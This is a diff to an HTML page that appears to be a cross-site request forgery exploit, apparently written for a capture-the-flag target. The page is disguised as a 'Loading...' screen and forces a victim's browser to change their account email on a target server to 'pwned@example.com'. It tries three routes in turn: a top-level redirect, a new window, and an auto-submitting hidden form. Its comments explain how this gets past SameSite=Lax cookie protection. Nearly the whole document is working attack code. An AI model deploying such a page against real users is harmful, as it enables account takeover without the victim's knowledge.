@@ -1,15 +1,38 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta
-      http-equiv="refresh"
-      content="0;url=http://100.101.228.35:6009/settings/email?new=newemail@example.com"
-    />
-    <title>Account Settings</title>
-  </head>
-  <body>
-    <p>Fetching flag...</p>
-  </body>
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Loading...</title>
+</head>
+<body>
+<p>Loading...</p>
+
+<form id="csrf" action="http://100.101.228.35:6009/settings/email" method="GET">
+  <input type="hidden" name="new" value="pwned@example.com" />
+</form>
+
+<script>
+  var url = "http://100.101.228.35:6009/settings/email?new=pwned@example.com";
+
+  try {
+    // Primary attempt: top-level navigation of the current window.
+    // This is what Lax is supposed to allow for a GET top-level nav.
+    window.top.location.href = url;
+  } catch (e) {
+    // If window.top is cross-origin-blocked or we're sandboxed, fall through.
+  }
+
+  // Fallback: in case the above is swallowed (e.g. sandboxed frame),
+  // try opening a brand-new top-level browsing context instead.
+  setTimeout(function () {
+    window.open(url, "_blank");
+  }, 1000);
+
+  // Belt-and-braces: also auto-submit the form as a real top-level GET nav.
+  setTimeout(function () {
+    document.getElementById("csrf").submit();
+  }, 2000);
+</script>
+</body>
 </html>
